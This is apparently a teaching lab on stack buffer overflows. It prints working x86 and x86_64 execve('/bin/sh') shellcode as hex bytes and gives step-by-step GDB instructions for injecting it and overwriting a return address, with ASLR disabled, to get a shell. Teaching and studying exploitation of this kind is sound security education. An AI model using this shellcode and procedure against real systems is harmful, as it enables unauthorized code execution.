# Code Injection

Now that we understand what a buffer overflow is, what can we do with it?

## Shellcode Injection

In this lab, we will learn how to call a shellcode from within a program 
using `execve`.

You can find the following shellcodes online by searching for x86 (or x86\_64) 
shellcode. If you are on a different architecture, you can find those.

**x86**

```
"\x31\xc0"              // xor    %eax,%eax
"\x50"                  // push   %eax
"\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
"\x89\xe3"              // mov    %esp,%ebx
"\x89\xc1"              // mov    %eax,%ecx
"\x89\xc2"              // mov    %eax,%edx
"\xb0\x0b"              // mov    $0xb,%al
"\xcd\x80"              // int    $0x80
"\x31\xc0"              // xor    %eax,%eax
"\x40"                  // inc    %eax
"\xcd\x80"              // int    $0x80
```

**x86\_64**

```
"\x48\x31\xd2"                                  // xor    %rdx, %rdx
"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov $0x68732f6e69622f2f, %rbx
"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
"\x53"                                          // push   %rbx
"\x48\x89\xe7"                                  // mov    %rsp, %rdi
"\x50"                                          // push   %rax
"\x57"                                          // push   %rdi
"\x48\x89\xe6"                                  // mov    %rsp, %rsi
"\xb0\x3b"                                      // mov    $0x3b, %al
"\x0f\x05"                                      // syscall
```

### Example Inject

We begin this lab by repeating the steps from the previous buffer overflow 
example. If you don't understand the following instructions, you might want to 
revisit the previous example.

1. Disable ASLR.
2. Compile the program with the same flags as earlier.
3. Open the program with GDB.
4. Dissassemble the vulnerable function to find the actual size of the buffer.
5. Create a breakpoint after filling the buffer, but before returning from 
the function.
6. Run the program with the shellcode as the input. 
    -You may remember that x86 is little-endian, and might be tempted to 
    input the shellcode backwards somehow. That's not neccessary here, you 
    can input the shellcode in the order shown above.
7. GDB will break and wait for input.
8. Examine the stack using `x /32x $sp`. You should see your shellcode input in 
the stack somewhere. Take note of the address where this code is. You will 
need this address.
    - You can index with relative addresses if you want to refine your search 
    by using `x /32x ($sp + 8)` or similar.
9. Run the program again with input consisting of shellcode, spacing 
characters, and the return address.
10. If you did this correctly, you should get a shell.

### ASLR: Address Space Layout Randomization

Now that we can inject a shellcode from within GDB, we have to revisit our 
previous discussion about ASLR.
